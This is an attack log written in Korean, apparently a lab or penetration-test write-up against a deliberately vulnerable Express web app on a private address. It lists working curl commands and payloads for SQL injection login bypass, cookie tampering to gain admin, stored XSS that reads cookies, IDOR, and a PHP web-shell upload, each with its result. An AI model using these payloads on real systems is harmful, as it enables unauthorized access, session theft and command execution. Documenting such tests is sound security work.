# 공격 과정 기록

## 1. 초기 정찰 (Information Gathering)

### 1.1 서버 응답 분석
```bash
curl -I -H "X-Forwarded-For: 10.0.0.101" "http://192.168.0.28:3000"
```
- **서버**: Express (Node.js)
- **특이 헤더**: X-Request-ID (UUID)
- **보안 헤더 누락 확인**

### 1.2 디렉토리 스캔 (Gobuster)
```bash
gobuster dir -u "http://192.168.0.28:3000" -w /usr/share/wordlists/dirb/common.txt -H "X-Forwarded-For: 10.0.0.101"
```
**발견된 경로**:
- `/board` - Q&A 게시판
- `/login`, `/Login` - 로그인
- `/logout` - 로그아웃
- `/order` - 주문 내역
- `/profile` - 프로필
- `/signup` - 회원가입
- `/uploads` - 업로드 디렉토리
- `/images` - 이미지

---

## 2. SQL Injection 공격

### 2.1 로그인 우회 시도
```bash
# 기본 SQL Injection
curl -X POST -d "username=admin'--&password=test" "http://192.168.0.28:3000/login"

# OR 1=1 페이로드
curl -X POST -d "username=' OR '1'='1&password=' OR '1'='1" "http://192.168.0.28:3000/login"
```

### 2.2 결과
- `admin'--` 페이로드로 admin 계정 로그인 성공
- 쿠키 발급: `user=admin; isAdmin=false; user_id=1`

---

## 3. 권한 상승 공격

### 3.1 쿠키 분석
로그인 시 발급되는 쿠키:
- `user` - 사용자 이름
- `isAdmin` - 관리자 여부 (boolean)
- `user_id` - 사용자 ID

### 3.2 쿠키 조작
```bash
curl -H "Cookie: user=admin; isAdmin=true; user_id=1" "http://192.168.0.28:3000"
```

### 3.3 결과
`isAdmin=true`로 변경 시 관리자 메뉴 노출:
- `/admin/products` - 상품 관리
- `/admin/users` - 사용자 관리

---

## 4. XSS 공격

### 4.1 Stored XSS 테스트
```bash
# 기본 스크립트 삽입
curl -X POST -d "content=<script>alert('XSS')</script>" "http://192.168.0.28:3000/board"

# 이벤트 핸들러 방식
curl -X POST -d "content=<img src=x onerror=alert(document.cookie)>" "http://192.168.0.28:3000/board"
```

### 4.2 결과
- 입력값이 HTML 이스케이프 없이 그대로 출력됨
- 소스 주석에서 취약점 힌트 발견: `<!-- VULNERABILITY: Unescaped output allows XSS (except v3) -->`

---

## 5. IDOR 공격

### 5.1 주문 정보 접근
```bash
# 다른 사용자의 주문 조회
curl -H "Cookie: user=guest; user_id=2" "http://192.168.0.28:3000/order?id=1"
```

### 5.2 결과
- guest(user_id=2)로 admin(user_id=1)의 주문 정보 조회 성공
- 소유자 검증 없음

---

## 6. 파일 업로드 공격

### 6.1 악성 파일 업로드
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -X POST -F "profile_image=@/tmp/shell.php;type=image/jpeg" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    "http://192.168.0.28:3000/profile/upload"
```

### 6.2 결과
- 파일 확장자/타입 검증 없음
- `/uploads/shell.php`로 접근 가능
- PHP 코드 그대로 저장됨 (Node.js라서 실행은 안됨)

---

## 7. 추가 발견사항

### 7.1 Nikto 스캔 결과
- X-Frame-Options 헤더 누락 (클릭재킹 가능)
- X-Content-Type-Options 헤더 누락
- X-Powered-By: Express (서버 정보 노출)

### 7.2 사용자 열거
관리자 페이지에서 전체 사용자 목록 노출 (약 100+ 계정)

---

## 타임라인
| 시간 | 활동 |
|------|------|
| 00:00 | 환경 설정 및 초기 정찰 시작 |
| 00:02 | 서버 응답 분석 완료 |
| 00:03 | SQL Injection 발견 및 로그인 우회 성공 |
| 00:05 | 쿠키 조작 권한 상승 성공 |
| 00:07 | XSS 취약점 확인 |
| 00:08 | IDOR 취약점 확인 |
| 00:10 | 파일 업로드 취약점 확인 |
| 00:15 | 보고서 작성 시작 |
